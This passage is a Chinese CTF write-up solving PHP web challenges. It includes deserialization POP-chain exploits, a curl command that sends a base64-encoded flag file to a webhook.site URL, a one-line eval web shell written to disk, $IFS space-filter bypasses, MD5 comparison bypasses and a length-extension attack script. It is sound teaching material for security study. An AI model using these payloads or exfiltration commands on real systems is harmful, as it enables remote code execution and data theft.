web 类为⼊⼝，echo 触发 re 类的 __toString()，通过 $this->chu0->$nononono 触 发 pwn 类的 __get()，再通过 $this->over->getflag() 执⾏ Misc 类的 getflag() 函数，从⽽得到 flag。

这里的_toString()需要所在的对象看做字符串才可触发，_get()触发条件是 试图访问一个对象中不可访问或者不存在的属性

 

exp

```php
<?php
class re{
    public $chu0;
    public function __toString(){  // 当对象被当做字符串时自动调用（找echo $this->a这种、strtolower()等）
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;  // 2 pwn
    }
}
 
class web {
    public $kw;
    public $dt;
 
    public function __wakeup() {  // wakeup 在反序列化时会自己触发的，也就是链头了
        echo "lalalla".$this->kw;  // 3 re
    }
 
    public function __destruct() {
        echo "ALL Done!";
    }
}
 
class pwn {
    public $dusk;
    public $over;
 
    public function __get($name) {   // 调用类中不存在变量时触发（找有连续箭头的 this->a->b）
        if($this->dusk != "gods"){  
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();  // 1 Misc
    }
}
 
class Misc {
    public $nothing;
    public $flag;
 
    public function getflag() {
        eval("system('cat /flag');");
    }
}
 
class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }
 
    public function getflag() {
        echo "you are over!";
    }
}
 
$m = new Misc();
$p = new pwn();
$p->over = $m;
$r = new re();
$r->chu0 = $p;
$w = new web();
$w->kw = $r;
echo serialize($w);
 
 
?>
```

得到payload

```php
?ser=O:3:"web":2:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";N;s:4:"over";O:4:"Misc":2:{s:7:"nothing";N;s:4:"flag";N;}}}s:2:"dt";N;}ALL Done!
```

GET上传得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731736638945-a96b7bee-b2cc-439f-abfe-7bd052869456.png)

#### <font style="color:rgb(79, 79, 79);">反序列化</font>
参考文章[链接](https://blog.csdn.net/m0_73185293/article/details/131353031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522B7E564A8-AB7D-4480-9B2C-91AE97CD4A96%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=B7E564A8-AB7D-4480-9B2C-91AE97CD4A96&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131353031-null-null.142^v100^pc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187)

##### <font style="color:rgb(79, 79, 79);">概述</font>
反序列化是将序列化得到的字符串转化为一个对象的过程；



 反序列化生成的对象的成员属性值由被反序列化的字符串决定，与原来类预定义的值无关；

  

反序列化使用unserialize()函数将字符串转换为对象，序列化使用serialize()函数将对象转化为字符串；

```php
//反序列化
 
<?php
class test
{
    public $a="haha";
    public $b=123;
}
 
$ha='O:4:"test":2:{s:1:"a";s:3:"666";s:1:"b";i:6666;}';
$ha=unserialize($ha)
var_dump($ha);
 
?>
 
//输出：
object(test)#1 (2) {
  ["a"]=>
  string(3) "666"
  ["b"]=>
  int(6666)
}
 
 
//如上将字符串转换为对象，且对象的值与类预定义的值无关，取决于被反序列化的字符串
```

##### <font style="color:rgb(79, 79, 79);">反序列化漏洞的成因</font>
<font style="color:rgb(77, 77, 77);">反序列化过程中unserialize()函数的参数可以控制，传入特殊的序列化后的字符串可改变对象的属性值，并触发特定函数执行代码；</font>

```php
//反序列化漏洞简单案例
 
<?php
class test
{
    public $a="haha";
    public function display()
    {
        eval($this->a);
    }
}
$cmd=$_GET['cmd'];
//cmd=O:4:"test":1:{s:1:"a";s:10:"phpinfo();";}
$d=unserialize($cmd);
$d->display();
 
?>
 
//如上反序列化的内容是GET方法获得的，是可控的，传入上图注释中的cmd
//内容，可实现执行php代码：phpinfo();
```

#### 常见的php反序列化ctf题目的做题步骤
1、复制源代码到本地

2、注释掉和属性无关的内容（只剩类名和属性）

3、根据题目需要给属性赋值（最关键的一步）

4、生成序列化数据，通常要urlencode

5、传递数据到服务器（攻击目标）

## 一起吃豆豆
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731484862251-f2a41cc5-7b56-4c6d-8c03-2eac4637a572.png)

JS小游戏通关后会出现flag

由于F12键被禁用 于是鼠标右键检查进入开发者模式

在调试器处的index.js文件有游戏规则的相关js代码翻到最底部发现一段可疑密文 进行base64解码后发现flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731485141881-c48f6afa-f8a1-47df-a05c-f0369fff1f69.png)

#### 
## 你听不到我的声音
题目代码

```php
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

以POST上传参数到shell可以进行任意命令执行 但是由于没有直接回显 , 我们需要用其他方式进行外带



1、重定向到文件

我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载

```php
cmd=cat /flag>1
```

上传后下载文件即可发现flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592235566-325de4ff-55d3-44a1-9996-59a924955958.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592190689-2b562867-dda8-42bf-beb3-74a10497fb67.png)

2、通过curl外带

我们可以通过 https://webhook.site/ 来进行数据外带, 我们可以拿到这样一个链接

```php
https://webhook.site/aaa9bd52-0fe8-4c8e-b8d0-b13dd8fded07
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592560803-ed1b4ab5-b61f-485f-aaa7-08b18abcb401.png)

此时这个路径下的所有请求都会被记录

于是我们可以通过shell指令

```php
cmd=curl https://webhook.site/aaa9bd52-0fe8-4c8e-b8d0-b13dd8fded07/`cat /flag | base64`
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592964691-bddeb5d4-2c90-4605-86e6-a22f44fe28ca.png)

3、直接写马

```php
cmd=echo "<?php eval(\$_POST[0]);" > a.php
```

注意（$需要在前面加反斜杠进行转义）并且语句需要url编码

```php
cmd=echo%20%22%3C%3Fphp%20eval(%5c%24_POST%5B0%5D)%3B%22%20%3E%20a.php
```

在用中国蚁剑去连接得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731596746598-b8048b79-bab9-4f6c-90a4-c74919326c86.png)

得到flag

#### 关于linux常用命令——重定向
参考文章[链接](https://blog.csdn.net/shanliangliuxing/article/details/8799153?ops_request_misc=&request_id=&biz_id=102&utm_term=%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8799153.142^v100^control&spm=1018.2226.3001.4187)

重定向能够实现Linux命令的输入输出与文件之间重定向，以及实现将多个命令组合起来实现更加强大的命令。这部分涉及到的比较多的命令主要有：

```php
    cat：连接文件
    sort：排序文本行
    uniq：忽略或者报告重复行
    wc：统计文件的行数、词数、字节数
    grep：打印匹配制定模式的行
    head：输出文件的头部
    tail：输出文件的尾部
    tee：从标准输入读，并往标准输出或者文件写
```

##### 1、重定向符号
```php
>               输出重定向到一个文件或设备 覆盖原来的文件
>!              输出重定向到一个文件或设备 强制覆盖原来的文件
>>             输出重定向到一个文件或设备 追加原来的文件
<               输入重定向到一个程序 
```

##### 2、标准错误重定向符号
```php
2>             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  b-shell
2>>           将一个标准错误输出重定向到一个文件或设备 追加到原来的文件
2>&1         将一个标准错误输出重定向到标准输出 注释:1 可能就是代表 标准输出
>&             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  c-shell
|&              将一个标准错误 管道 输送 到另一个命令作为输入
```

#####   
  3、命令重导向示例
```php
在 bash 命令执行的过程中，主要有三种输出入的状况，分别是：
1. 标准输入；代码为 0 ；或称为 stdin ；使用的方式为 <
2. 标准输出：代码为 1 ；或称为 stdout；使用的方式为 1>
3. 错误输出：代码为 2 ；或称为 stderr；使用的方式为 2>

test @test test]# ls -al > list.txt
将显示的结果输出到 list.txt 文件中，若该文件以存在则予以取代！

[test @test test]# ls -al >> list.txt
将显示的结果累加到 list.txt 文件中，该文件为累加的，旧数据保留！

[test @test test]# ls -al  1> list.txt   2> list.err
将显示的数据，正确的输出到 list.txt 错误的数据输出到 list.err

[test @test test]# ls -al 1> list.txt 2> &1
将显示的数据，不论正确或错误均输出到 list.txt 当中！
错误与正确文件输出到同一个文件中，则必须以上面的方法来写！不能写成其它格式！

test @test test]# ls -al 1> list.txt 2> /dev/null
将显示的数据，正确的输出到 list.txt 错误的数据则予以丢弃！
/dev/null ，可以说成是黑洞装置。为空，即不保存。

```

##### 4、为何要使用命令输出重导向
```php
当屏幕输出的信息很重要，而且我们需要将他存下来的时候；
背景执行中的程序，不希望他干扰屏幕正常的输出结果时；
一些系统的例行命令（例如写在 /etc/crontab 中的文件）的执行结果，希望他可以存下来时；
一些执行命令，我们已经知道他可能的错误讯息，所以想以『 2> /dev/null 』将他丢掉时；
错误讯息与正确讯息需要分别输出时。
```

#### 关于curl外带原理
参考文章[链接](https://blog.csdn.net/qq_46918279/article/details/121061134?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522D504C9D0-BC4E-4E9F-A061-C95391708225%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=D504C9D0-BC4E-4E9F-A061-C95391708225&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121061134-null-null.142^v100^control&utm_term=curl%E5%A4%96%E5%B8%A6&spm=1018.2226.3001.4187)

##### curl简介
curl是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。

cURL支持的通信协议有FTP、FTPS、HTTP、HTTPS等等。

##### curl使用条件
无论是在渗透测试还是ctf比赛中我们都可能会遇到目标应用把用户的输入当做系统命令或者系统命令的一部分去执行的情况。

在实际渗透中，还有很多不会直接回显的情况，这种时候我们就需要利用各种带外通信技巧

如题目中就是配合网站https://webhook.site/进行curl外带得到flag

##### curl使用方法
语法

```php
curl [option] [url]
```

 使用命令：  

```php
curl http://curl.haxx.se
```

 这是最简单的使用方法。用这个命令获得了http://curl.haxx.se指向的页面，同样，如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地  

```php
curl -X POST -F xx=@flag.php  http://aaa
```

这条命令被目标网站执行，那么意思就是：从目标网站以POST方式向[http://aaa](http://aaa)上传一个文件，名字叫xx 文件内容是flag.php（要使用curl上传文件时，只需在文件位置之前添加@。该文件可以支持任意类型的文件）

## RCEisamazingwithspace
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731649542204-939a62d5-e2c8-4207-8874-5a6f2c2eaa25.png)

php代码审计发现任意命令执行并且存在正则匹配过滤空格

所以我们只需将任意命令中的空格替代就可获得flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731649870902-1c5713a4-79c5-48a7-871b-7f84a6d64ccc.png)

#### 常用的代替空格的符号
参考文章[链接](https://blog.csdn.net/2301_76690905/article/details/134759718?ops_request_misc=&request_id=&biz_id=102&utm_term=%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%B8%B8%E7%94%A8%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%AC%A6%E5%8F%B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-134759718.142^v100^pc_search_result_base7&spm=1018.2226.3001.4187)

##### <font style="color:rgb(77, 77, 77);">1、大括号{}：</font>
```php
{cat,flag.php}
```

##### 2、$IFS代替空格
<font style="color:rgb(77, 77, 77);">$IFS$9，${IFS}，$IFS这三个都行</font>

```php
Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。
?cmd=ls$IFS-I
单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名
?cmd=ls${IFS}-l
$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。
?cmd=ls${IFS}$9-l
```

##### <font style="color:rgb(77, 77, 77);">3、重定向字符<，<></font>
##### <font style="color:rgb(77, 77, 77);">4、%09绕过（相当于Tab键）</font>
## <font style="background-color:#FFFFFF;">听</font><font style="color:#000000;background-color:#FFFFFF;">说你很懂MD5？</font>
题目代码

```php
<?php
  session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
  die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
  die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
  die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
  $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
  die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
  die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag');
```

第一个地方用的强比较, 我们可以利用数组绕过

```php
banana[]=2&apple[]=1
```

第二个地方强转成了 string, 此时数组会变成<font style="color:#601BDE;">Array</font>无法绕过

但是由于后面是弱相等 让 <font style="color:#601BDE;">0e</font>开头的字符串使 php 误认为是科学计数法, 从而转换为 0

我们只需要寻找md5加密后是0e开头的即可

以下md5后开头为0e的字符串：

```php
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
0e215962017
```

所以

```php
banana[]=2&apple[]=1&bananana=QNKCDZO&appple=s155964671a
```

第三个地方第二个地方用了强比较, 此时我们需要找到真实的 MD5 值一致的内容

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731554469093-4f44afdb-7d23-46a2-b9f5-525f2a5b0ba2.png)

由于两个不同字符串可以拥有相同的md5值

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731561974417-a7d7c1a3-b211-4a30-a8a9-54c9691ce118.png)

第四个地方用到了哈希长度拓展攻击

这里用到python的脚本工具

```python
from struct import pack, unpack
from math import floor, sin

class MD5:

    def __init__(self):
        self.A, self.B, self.C, self.D = \
        (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values
        self.r: list[int] = \
        [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \
        [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values
        self.k: list[int] = \
        [floor(abs(sin(i + 1)) * pow(2, 32))
         for i in range(64)]  # constants

    def _lrot(self, x: int, n: int) -> int:
        # left rotate
        return (x << n) | (x >> 32 - n)

    def update(self, chunk: bytes) -> None:
        # update the hash for a chunk of data (64 bytes)
        w = list(unpack('<'+'I'*16, chunk))
        a, b, c, d = self.A, self.B, self.C, self.D

        for i in range(64):
            if i < 16:
                f = (b & c) | ((~b) & d)
                flag = i
            elif i < 32:
                f = (b & d) | (c & (~d))
                flag = (5 * i + 1) % 16
            elif i < 48:
                f = (b ^ c ^ d)
                flag = (3 * i + 5) % 16
            else:
                f = c ^ (b | (~d))
                flag = (7 * i) % 16

            tmp = b + \
            self._lrot((a + f + self.k[i] + w[flag])
                       & 0xffffffff, self.r[i])
            a, b, c, d = d, tmp & 0xffffffff, b, c

        self.A = (self.A + a) & 0xffffffff
        self.B = (self.B + b) & 0xffffffff
        self.C = (self.C + c) & 0xffffffff
        self.D = (self.D + d) & 0xffffffff

    def extend(self, msg: bytes) -> None:
        # extend the hash with a new message (padded)
        assert len(msg) % 64 == 0
        for i in range(0, len(msg), 64):
            self.update(msg[i:i + 64])

    def padding(self, msg: bytes) -> bytes:
        # pad the message
        length = pack('<Q', len(msg) * 8)

        msg += b'\x80'
        msg += b'\x00' * ((56 - len(msg)) % 64)
        msg += length

        return msg

    def digest(self) -> bytes:
        # return the hash
        return pack('<IIII', self.A, self.B, self.C, self.D)


def verify_md5(test_string: bytes) -> None:
    # (DEBUG function) verify the MD5 implementation
    from hashlib import md5 as md5_hashlib

    def md5_manual(msg: bytes) -> bytes:
        md5 = MD5()
        md5.extend(md5.padding(msg))
        return md5.digest()

    manual_result = md5_manual(test_string).hex()
    hashlib_result = md5_hashlib(test_string).hexdigest()

    assert manual_result == hashlib_result, "Test failed!"


def attack(message_len: int, known_hash: str,
           append_str: bytes) -> tuple:
    # MD5 extension attack
    md5 = MD5()

    previous_text = md5.padding(b"*" * message_len)
    current_text = previous_text + append_str

    md5.A, md5.B, md5.C, md5.D = unpack("<IIII", bytes.fromhex(known_hash))
    md5.extend(md5.padding(current_text)[len(previous_text):])

    return current_text[message_len:], md5.digest().hex()


    if __name__ == '__main__':

    message_len = int(input("[>] Input known text length: "))
    known_hash = input("[>] Input known hash: ").strip()
    append_text = input("[>] Input append text: ").strip().encode()

    print("[*] Attacking...")

    extend_str, final_hash = attack(message_len, known_hash, append_text)

    from urllib.parse import quote
    from base64 import b64encode

    print("[+] Extend text:", extend_str)
    print("[+] Extend text (URL encoded):", quote(extend_str))
    print("[+] Extend text (Base64):", b64encode(extend_str).decode())
    print("[+] Final hash:", final_hash)
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637002573-3643aea4-d604-4191-863e-83f539374162.png)

把Final hash的值赋给md5 Extend text的值赋给name就可得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637180173-c55add0a-3b8a-48d4-8599-6267df59dcf7.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637193568-f060cf95-f3ad-43d2-bdda-59fc7f0d42a8.png)

### MD5的知识小结
参考文章：[链接](https://blog.csdn.net/weixin_37730482/article/details/70258547?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226089B332-44EF-4773-94E0-5B2F2AE68ADD%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6089B332-44EF-4773-94E0-5B2F2AE68ADD&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-70258547-null-null.142^v100^pc_search_result_base7&utm_term=md5%E7%AE%80%E4%BB%8B&spm=1018.2226.3001.4187) [链接](https://blog.csdn.net/qq_45290991/article/details/120400363?ops_request_misc=%257B%2522request%255Fid%2522%253A%252271EC1266-17C8-4610-9FAA-0B6DB465740C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=71EC1266-17C8-4610-9FAA-0B6DB465740C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120400363-null-null.142^v100^pc_search_result_base7&utm_term=%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&spm=1018.2226.3001.4187)

#### 1、md5简介及特点
MD5英文全称“Message-Digest Algorithm 5”，翻译过来是“消息摘要算法5”，由MD2、MD3、MD4演变过来的，是一种单向加密算法，是不可逆的一种的加密方式。

特点：

```php
压缩性：任意长度的数据，算出的MD5值长度都是固定的。

容易计算：从原数据计算出MD5值很容易。

抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。

强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。
```

#### 2、md5的算法原理
对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。



总体流程如下图所示， 表示第i个分组，每次的运算都由前一轮的128位结果值和第i块512bit值进行运算。

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637620049-36843ded-0c3c-41e5-9ecf-0705cdd821e8.png)

#### 3、md5在ctf比赛中可利用的方法
##### 在php中的弱相等和强相等的绕过
###### 弱相等：
当遇到弱相等时 可利用0e绕过和数组绕过

例如

```php
0e123==0e456  //由于在php被认为时科学计数法所以二者都等于0
banana[]==apple[] //由于数组在转化时都成null所以两者相等
```

当遇到string且弱相等时 数组绕过就不能使用只能使用0e绕过！！！

###### 强相等：
当遇到强相等时 常见的绕过方式是数组绕过

例如

```php
banana[]===apple[] //由于数组在转化时都成null所以两者相等
```

当遇到string且强相等时 数组绕过不能使用 但是由于md5值具有不唯一性

可能两个不同的字符串会有相同的md5值 所以我们可通过md5碰撞来绕过

例如

```php
banana=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
apple= TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
md5((string)$apple) === md5((string)$banana))
```

找到真实的 MD5 值一致的内容, 我们可以使用 fastcoll 工具

[链接](https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)

##### 哈希长度拓展攻击
###### 什么是哈希长度拓展攻击
<font style="color:rgb(77, 77, 77);">哈希长度扩展攻击(hash lengthextensionattacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。次攻击适用于MD5和SHA-1等基于Merkle–Damgård构造的算法</font>

###### <font style="color:rgb(79, 79, 79);">MD5扩展攻击介绍</font>
![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648567225-87360a1b-2db2-46e1-ba55-b197d78c7428.jpeg)

<font style="color:rgb(77, 77, 77);">我们需要了解以下几点md5加密过程：</font>

<font style="color:rgb(85, 86, 102);">1、MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</font>

<font style="color:rgb(85, 86, 102);">2、关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</font>

<font style="color:rgb(85, 86, 102);">3、MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量</font><font style="color:rgb(85, 86, 102);">。</font>

<font style="color:rgb(77, 77, 77);">举一个例子讲一下如何填充：比如字符串“Acker” </font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(77, 77, 77);">0x41636b6572这里与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下：</font>

```php
0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000
```

<font style="color:rgb(77, 77, 77);">此处补充：以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4=512这就是一组，正好是512bit</font><font style="color:rgb(77, 77, 77);">。</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648728768-3334b5f2-efcb-4544-9e74-1285ec7f2201.jpeg)

<font style="color:rgb(77, 77, 77);">上图中的8是因为补位时二进制第一位要补1，那么1000转换成16进制就是8.后面都补上0.</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648747002-fe3bb4a2-74af-4142-8ad1-2e323ca3fcfc.jpeg)

<font style="color:rgb(77, 77, 77);">填充数据最后8字节长度，Acker长度为5*8=40bit，又因为0x28=40所以16进制显示为28.</font>

<font style="color:rgb(77, 77, 77);">为什么数据会在左端：MD5中储存的都是小端方式，比如0x12345678，那么md5存储顺序就是0x78563412</font>

###### <font style="color:rgb(79, 79, 79);">MD5拓展攻击演示</font>
<font style="color:rgb(77, 77, 77);">下图为加密流程图，可以更直观看清楚整个流程。</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648811483-3d320796-f89a-46a5-99dc-d043f32dfba5.jpeg)

<font style="color:rgb(77, 77, 77);">选一个字符串例如“Acker”MD5（“Acker”）= dee2fb2df156f4040f893d8a10ac1034</font>

<font style="color:rgb(77, 77, 77);">现在我们不需要知道字符串是什么。只需要知道其长度，并将字符串填充完，新加一个字符串如：addition，之前得到的“Acker”MD5值作为最后一块加密的初始向量，最后得到的结果和MD5（“Acker+addition”）是一样的。</font>

<font style="color:rgb(77, 77, 77);">题目中的md5=md5(random+name)也是同样的原理</font>

## Really EZ POP
题目代码

```php
 <?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
} 
```

<font style="color:rgb(77, 77, 77);">思考怎么构建这个pop链 而这道题在类名上就已经有了非常明显的提示了：Nature->sea->shark->sink</font>

<font style="color:rgb(77, 77, 77);">然后我们根据代码理清思路是Nature: __destruct() ---> Sea: __get() ---> Shark: __invoke() ---> Sink: __toString() ---> RCE。但是这里要注意的一点就是，这道题中有private属性的成员，那么有些是不可在外部更改的，那么我们就需要在内部修改或者在内部写一个函数使我们能在外部修改。（例如这里的0Shark\0word代表shark里的私有属性word；0Sink\0cmd就代表sink里的私有属性cmd）</font>

<font style="color:rgb(77, 77, 77);">POC</font>

```php
<?php
// highlight_file(__FILE__);

class Sink
{
    private $cmd = 'system("cat /flag");';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
//存在 private 字段, 由于 php 版本低于 7.1+, 所以我们需要保留好他的访问性
    public function setWord($word) //关键, 控制到word的值
    {
        $this->word = $word;
    }

    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

$a=new Nature();
$a->sea=new Sea();
$a->sea->animal=new Shark();
$a->sea->animal->setWord(new Sink());

echo urlencode(serialize($a));

//O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D

```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731735946559-10aeb512-e31b-47fc-8158-4690cadd3357.png)

发送请求包得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731735975531-2971e965-067d-4e8f-858c-fe902f498a73.png)

### 关于POP链的构造
参考文章[链接](https://blog.csdn.net/m0_73185293/article/details/131353031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522B7E564A8-AB7D-4480-9B2C-91AE97CD4A96%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=B7E564A8-AB7D-4480-9B2C-91AE97CD4A96&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131353031-null-null.142^v100^pc_search_result_base7&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187)

#### <font style="color:rgb(77, 77, 77);">常见魔术方法的触发</font>
```php
//魔术方法
 
__construct()       //类的构造函数，创建对象时触发
 
__destruct()        //类的析构函数，对象被销毁时触发
 
__call()            //调用对象不可访问、不存在的方法时触发
 
__callStatic()     //在静态上下文中调用不可访问的方法时触发
 
__get()            //调用不可访问、不存在的对象成员属性时触发
 
__set()           //在给不可访问、不存在的对象成员属性赋值时触发
 
__isset()         //当对不可访问属性调用isset()或empty()时触发
 
__unset()         //在不可访问的属性上使用unset()时触发
 
__invoke()        //把对象当初函数调用时触发
 
__sleep()        //执行serialize()时，先会调用这个方法
 
__wakeup()       //执行unserialize()时，先会调用这个方法
 
__toString()     //把对象当成字符串调用时触发
 
__clone()        //使用clone关键字拷贝完一个对象后触发
```

##### __construct()和__destruct()
```php
//__construct()和__destruct()
 
<?php
class test
{
    public $a="haha";
    public function __construct()
    {
        echo "已创建--";
    }
    public function __destruct()
    {
        echo "已销毁";
    }
}
$a=new test();
 
?>
 
//输出：
已创建--已销毁
 
//对象被创建时触发__construct()方法，对象使用完被销毁时触发__destruct()方法
```

##### __sleep()和__wakeup()
```php
//__sleep()和__wakeup()
 
<?php
class test
{
    public $a="haha";
    public function __sleep()
    {
        echo "使用了serialize()--";
        return array("a");
    }
    public function __wakeup()
    {
        echo "使用了unserialzie()";
    }
}
 
$a=new test();
$b=serialize($a);
$c=unserialize($b);
 
?>
 
//输出：
使用了serialize()--使用了unserialzie()
 
//对象被序列化时触发了__sleep(),字符串被反序列化时触发了__wakeup()
```

##### __toString()和__invoke()
```php
//__toString()和__invoke()
 
<?php
class test
{
    public $a="haha";
    public function __toString()
    {
        return "被当成字符串了--";
    }
